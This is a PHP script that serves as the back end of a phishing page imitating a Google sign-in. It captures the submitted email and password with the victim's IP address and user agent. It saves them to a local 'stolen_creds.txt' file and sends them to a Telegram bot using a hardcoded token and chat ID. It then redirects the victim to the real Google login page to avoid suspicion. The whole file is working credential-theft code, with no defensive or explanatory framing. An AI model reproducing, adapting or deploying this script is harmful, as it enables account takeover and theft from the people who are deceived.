<?php
// --- Configuration for Telegram Transmission ---
// Place your provided token and chat ID here
$BOT_TOKEN = '8268724111:AAFWGlzPTfGYHn9RfQthGEi_xSpQQDjh62I';
$CHAT_ID = '8397876605';
// --- End Configuration ---

// Define the file path for local logging (as a fallback/backup)
$file_path = 'stolen_creds.txt';

// Check if both email and password were sent via POST from the index.html form
if (isset($_POST['stolen_email']) && isset($_POST['stolen_password'])) {
    
    // Sanitize and capture the data
    $email = htmlspecialchars($_POST['stolen_email']);
    $password = htmlspecialchars($_POST['stolen_password']);
    
    // Get additional context
    $ip_address = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];

    // 1. LOCAL LOGGING (Backup)
    $log_entry = "TIME: " . date("Y-m-d H:i:s") . 
                 " | IP: " . $ip_address . 
                 " | AGENT: " . $user_agent . 
                 " | EMAIL: " . $email . 
                 " | PASSWORD: " . $password . "\n";
    
    // Append the log entry to the file.
    @file_put_contents($file_path, $log_entry, FILE_APPEND | LOCK_EX);

    // 2. TELEGRAM TRANSMISSION (Primary Goal using cURL)
    
    // Construct the message payload for Telegram
    $telegram_message = "🚨 *NEW GOOGLE CAPTURE!* 🚨\n\n" .
                        "📩 *Email:* `" . $email . "`\n" .
                        "🔑 *Password:* `" . $password . "`\n\n" .
                        "🌐 *IP:* `" . $ip_address . "`\n" .
                        "🤖 *User Agent:* `" . $user_agent . "`";

    $url = "https://api.telegram.org/bot" . $BOT_TOKEN . "/sendMessage";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Do not output result, just execute
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'chat_id' => $CHAT_ID,
        'text' => $telegram_message,
        'parse_mode' => 'Markdown'
    ]);
    
    // Execute the request quickly and close the cURL session
    @curl_exec($ch); 
    curl_close($ch);
    
    // 3. The Deception Finale: Redirect the victim (Must be the last thing executed)
    header('Location: https://accounts.google.com/ServiceLogin?error=0');
    exit();
} else {
    // If accessed directly or data is missing, redirect to Google to avoid suspicion.
    header('Location: https://www.google.com');
    exit();
}
?>
